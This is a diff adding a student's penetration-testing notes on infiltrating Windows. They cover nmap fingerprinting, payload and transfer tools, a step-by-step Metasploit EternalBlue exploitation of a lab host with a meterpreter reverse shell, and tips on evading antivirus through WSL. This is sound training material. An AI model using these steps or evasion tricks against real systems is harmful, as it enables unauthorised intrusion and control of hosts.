@@ -352,3 +352,72 @@ Infiltrating Windows
 atk surface grows daily:https://www.cvedetails.com/vendor/26/Microsoft.html
 \\Prominent Windows exploits
 MS08-067 , Eternal Blue, PrintNightmare, BlueKeep, Sigred, SeriousSam, Zerologon
+\\Enumerating Windows & Fingerprinting AuthenticationMethods
+-try to read Time to live (ttl) counter when utilizing ICMP to determine if the host is up 
+-window ttl will either be 32 or 128 this can be pretty reliable but not gurantee
+\\Pinged Host
+$ping 192.168.86.39
+$nmap -O -v to OS identify  or -A and -Pn 
+$sudo nmap -v -O 192.168.86.39
+\\Banner Grab to Enumerate ports
+$sudo nmap -v 192.168.86.39 --script banner.nse
+\\Bats, DLLs, & MSI Files, Oh My!
++DLLs +Batch +VBS +MSI +Powershell  watch out fo Tool tactics and procedures for building our payloads and delivering them onyo the host to land a shell
+\\Tools, Tactics, and Procedures for Payload generation, Transfer, and Execution
+\\Payload generation
++MSFVenom & Metaspoit-Framwork   https://github.com/rapid7/metasploit-framework
++Payload All The Thing   https://github.com/swisskyrepo/PayloadsAllTheThings
++Mythic C2 Framework    https://github.com/its-a-feature/Mythic
++Nishang    https://github.com/samratashok/nishang
++Darkarmour   https://github.com/bats3c/darkarmour
+\\Payload Transfer and Execution:
+besite vector web-drive-by, phishing email or dead drip, window have several other avenues of payload deliveryy.
++impacket https://github.com/fortra/impacket provides way to interract with network protocols directly, impacket deal with psexec, smbclient, wmi, kerberos, and ability to stand up an SMB server
++payload all the things  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md
+find quick oneliner to help transfer file across hosts expediently
++SMB: useful when host joined and utilize share to host data, we can use these smb share along with C$ and admin$ to host and transfer our payload and even exfiltrate data over the links
++Remote execution via MSF: built into many of the exploit module in metasploit is a func that will build, stage, and execute the payload auto
++ Other protocols: FTP, TFTP, HTTP/S -> enum and pay attention to the func that are open and avai for user
+\\EX Compromise Walkthrough
+\\Enum the host
+$nmap -v -A 10.129.201.97
+analyze result and refer to smt like MS17-010(eternalblue), IIS service, and SMB 
+-> validate it with MSF auxiliary/scanner/smb/smb_ms17_010
+2. search for and decide on an exploit path
+$msfconsole > search eternalblue.
+$use auxiliary/scanner/smb/smb_ms17_010  > show options > set RHOST 10.129.201.97 > run
+<r> found out target vul with eternalblue let setup the exploit and payload
+3. select exploit & payload then deliver
+\\Choose & configure Our exploit & payload
+msf> search eternalblue
+\\configure the Exploit & Payload
+msf>use 2 > options ensuer RHOSTS, LHOST, and LPORT field required
+-kept it simple and just used a windows/meterpreter/reverse_tcp payload. use this for diff shell type or obfuscate atk more/
+4. Execute Attack, and Receive A CAllback
+\\Execute Our Attack
+msf>exploit   meterpreter>getuid
+sucess -> utilize meterpreter shell to run further commands
+5. Identify the Native Shell
+\\Identify Our Shell 
+meterpreter > shell 
+\\CMD-Prompt and Power[Shell]s for fun and profit
+CMD deals with text input and output and doean't keep record command used, not effect by Execution Policy , and User Account Control (UAC)
+PowerShell utilize .NET object for all input and out put.
+Use CMD when:
+
+You are on an older host that may not include PowerShell.
+When you only require simple interactions/access to the host.
+When you plan to use simple batch files, net commands, or MS-DOS native tools.
+When you believe that execution policies may affect your ability to run scripts or other actions on the host.
+Use PowerShell when:
+
+You are planning to utilize cmdlets or other custom-built scripts.
+When you wish to interact with .NET objects instead of text output.
+When being stealthy is of lesser concern.
+If you are planning to interact with cloud-based services and hosts.
+If your scripts set and use Aliases.
+\\WSL and Powershell for Linux
+there malwares tha utilize Python3 and Linux bin to download install payload lib that are native to both window and linux WSL
+- any network request or functions executed to or from WSL instance are not parsed by Windows Firewall and Window Defender, making it a bit of a blind spot on the host
+-same issues found via PowerShell Core which can be installed on Linux operating system 
+hacker aim to use these features to avoid AV and EDR detection mechanism
